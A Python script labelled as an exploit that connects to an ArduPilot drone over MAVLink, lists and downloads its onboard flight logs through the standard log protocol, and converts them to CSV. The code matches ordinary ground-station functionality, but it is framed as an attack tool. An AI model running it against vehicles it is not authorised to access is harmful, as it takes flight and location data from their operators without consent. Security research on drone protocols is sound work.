#!/usr/bin/env python3
"""
Flight Log Extraction Exploit Script
Extracts ArduPilot BIN logs via MAVLink and converts to CSV
"""

import sys
import time
import os
from pathlib import Path
from pymavlink import mavutil

def list_logs(connection):
    """
    Request and receive list of available logs
    
    Args:
        connection: MAVLink connection object
    
    Returns:
        List of log entries
    """
    print("[*] Requesting log list...")
    connection.mav.log_request_list_send(
        connection.target_system,
        connection.target_component,
        0, 0xffff  # Start from 0, request all logs
    )
    
    logs = []
    timeout = time.time() + 10  # 10 second timeout
    
    while time.time() < timeout:
        msg = connection.recv_match(type=['LOG_ENTRY'], blocking=True, timeout=2)
        if msg is None:
            break
        logs.append({
            'id': msg.id,
            'num_logs': msg.num_logs,
            'last_log_num': msg.last_log_num,
            'time_utc': msg.time_utc,
            'size': msg.size
        })
        print(f"[+] Found log {msg.id}: {msg.size} bytes, time: {msg.time_utc}")
    
    return logs

def download_log(connection, log_id, log_size, output_file):
    """
    Download a specific log file
    
    Args:
        connection: MAVLink connection object
        log_id: Log ID to download
        log_size: Size of log in bytes
        output_file: Output file path
    
    Returns:
        True if successful
    """
    print(f"[*] Downloading log {log_id} ({log_size} bytes)...")
    
    with open(output_file, 'wb') as f:
        bytes_received = 0
        offset = 0
        chunk_size = 90  # MAVLink LOG_DATA payload size
        
        while bytes_received < log_size:
            # Request data chunk
            connection.mav.log_request_data_send(
                connection.target_system,
                connection.target_component,
                log_id,
                offset,
                min(chunk_size, log_size - offset)
            )
            
            # Wait for LOG_DATA message
            timeout = time.time() + 5
            received = False
            
            while time.time() < timeout:
                msg = connection.recv_match(type=['LOG_DATA'], blocking=True, timeout=1)
                if msg is None:
                    continue
                
                if msg.id == log_id and msg.ofs == offset:
                    data = bytes(msg.data[:msg.count])
                    f.write(data)
                    bytes_received += len(data)
                    offset += len(data)
                    received = True
                    
                    progress = (bytes_received / log_size) * 100
                    print(f"\r[*] Progress: {progress:.1f}% ({bytes_received}/{log_size} bytes)", end='', flush=True)
                    break
            
            if not received:
                print(f"\n[-] Timeout waiting for log data at offset {offset}")
                return False
        
        print(f"\n[+] Log {log_id} downloaded successfully to {output_file}")
        return True

def convert_bin_to_csv(bin_file, output_dir):
    """
    Convert BIN log to CSV using pybinlog
    
    Args:
        bin_file: Path to BIN file
        output_dir: Output directory for CSV files
    
    Returns:
        True if successful
    """
    try:
        import subprocess
        
        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)
        
        print(f"[*] Converting {bin_file} to CSV...")
        
        # Try using pybinlog/bin2csv
        try:
            result = subprocess.run(
                ['bin2csv', '-o', str(output_dir), str(bin_file)],
                capture_output=True,
                text=True,
                check=True
            )
            print(f"[+] Conversion successful. CSV files saved to {output_dir}")
            return True
        except (FileNotFoundError, subprocess.CalledProcessError):
            print("[!] bin2csv not found. Install with: pip install pybinlog")
            print("[!] Or use MAVProxy: mavproxy.py --logfile=<file>")
            return False
            
    except ImportError:
        print("[-] subprocess module not available")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 flight_log_extraction.py <connection> [log_id] [output_dir]")
        print("Example: python3 flight_log_extraction.py udp:127.0.0.1:14550")
        print("Example: python3 flight_log_extraction.py udp:127.0.0.1:14550 1 ./logs")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    specific_log_id = int(sys.argv[2]) if len(sys.argv) > 2 else None
    output_dir = sys.argv[3] if len(sys.argv) > 3 else "./extracted_logs"
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # List available logs
    logs = list_logs(connection)
    
    if not logs:
        print("[-] No logs found")
        sys.exit(1)
    
    print(f"\n[+] Found {len(logs)} log(s)")
    
    # Download logs
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    
    logs_to_download = logs
    if specific_log_id is not None:
        logs_to_download = [log for log in logs if log['id'] == specific_log_id]
        if not logs_to_download:
            print(f"[-] Log ID {specific_log_id} not found")
            sys.exit(1)
    
    for log in logs_to_download:
        bin_file = output_path / f"log_{log['id']}.bin"
        success = download_log(connection, log['id'], log['size'], bin_file)
        
        if success:
            # Convert to CSV
            csv_dir = output_path / f"log_{log['id']}_csv"
            convert_bin_to_csv(bin_file, csv_dir)
    
    print(f"\n[+] Extraction complete. Files saved to {output_path}")

if __name__ == "__main__":
    main()
